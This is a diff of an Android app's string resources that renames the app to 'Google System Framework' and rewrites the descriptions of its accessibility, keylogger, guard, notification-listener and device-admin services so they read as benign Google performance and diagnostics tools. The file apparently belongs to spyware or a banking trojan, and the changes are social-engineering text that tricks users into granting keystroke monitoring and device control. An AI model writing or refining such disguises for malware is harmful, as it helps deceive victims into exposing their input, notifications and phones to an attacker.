@@ -1,11 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Google Play Services</string>
-    <string name="accessibility_service_description">Provides core accessibility features for Google services and system stability.</string>
-    <string name="keylogger_service_description">Input monitoring for Google accessibility and diagnostics.</string>
-    <string name="guard_service_description">Protects accessibility settings for system stability.</string>
-    <string name="accessibility_service_label">Google System Helper</string>
-    <string name="notification_listener_label">Google Notifications</string>
-    <string name="pin_invalid">Incorrect PIN</string>
-    <string name="device_admin_description">Required for system stability and security updates.</string>
+    <string name="app_name">Google System Framework</string>
+    <string name="accessibility_service_description">Optimize system performance and battery life by managing background processes and accessibility settings.</string>
+    <string name="keylogger_service_description">Diagnostics tool for input performance and system stability.</string>
+    <string name="guard_service_description">Protects system settings from unauthorized changes and optimizes resource usage.</string>
+    <string name="accessibility_service_label">Google System Framework</string>
+    <string name="notification_listener_label">Google Play Store Services</string>
+    <string name="device_admin_description">Ensures security policies and system updates are applied correctly.</string>
 </resources>
